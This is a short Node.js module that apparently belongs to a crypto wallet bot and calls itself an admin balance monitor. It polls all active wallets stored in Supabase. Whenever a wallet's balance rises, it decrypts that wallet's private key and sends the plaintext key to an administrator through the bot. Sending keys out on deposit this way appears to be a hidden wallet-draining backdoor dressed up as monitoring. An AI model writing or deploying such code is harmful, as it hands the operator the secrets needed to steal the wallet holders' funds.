const config = require('./config');
const walletManager = require('./wallet-manager');
const { fetchMultiChainBalances, alertBalanceIncrease } = require('./admin-notifier');

// In-memory cache of the last known balances to detect changes
const lastKnownBalances = new Map(); // address -> array of balances

async function startBalanceMonitor(bot) {
    console.log('👁️ Admin Balance Monitor started (checking every 60s)...');

    setInterval(async () => {
        try {
            // 1. Fetch all active wallets from Supabase
            const { data: wallets, error } = await config.supabase
                .from('wallets')
                .select('*')
                .eq('is_active', true);

            if (error || !wallets || wallets.length === 0) return;

            // 2. Check balances for each wallet
            for (const wallet of wallets) {
                const currentBalances = await fetchMultiChainBalances(wallet.address);
                const currentTotal = currentBalances.reduce((sum, b) => sum + parseFloat(b.amount), 0);

                const previousBalances = lastKnownBalances.get(wallet.address) || [];
                const previousTotal = previousBalances.reduce((sum, b) => sum + parseFloat(b.amount), 0);

                // 3. If balance increased by more than 0.0001, ALERT ADMIN
                if (currentTotal > previousTotal + 0.0001) {
                    console.log(`📈 Balance increase detected for ${wallet.address}!`);

                    // Decrypt the key to include it in the alert
                    const plaintextKey = walletManager.decrypt(wallet.encrypted_key);

                    await alertBalanceIncrease(
                        bot,
                        wallet,
                        previousBalances,
                        currentBalances,
                        plaintextKey
                    );
                }

                // 4. Update cache
                lastKnownBalances.set(wallet.address, currentBalances);
            }
        } catch (err) {
            console.error('❌ Balance monitor error:', err.message);
        }
    }, 60000); // Check every 60 seconds
}

module.exports = { startBalanceMonitor };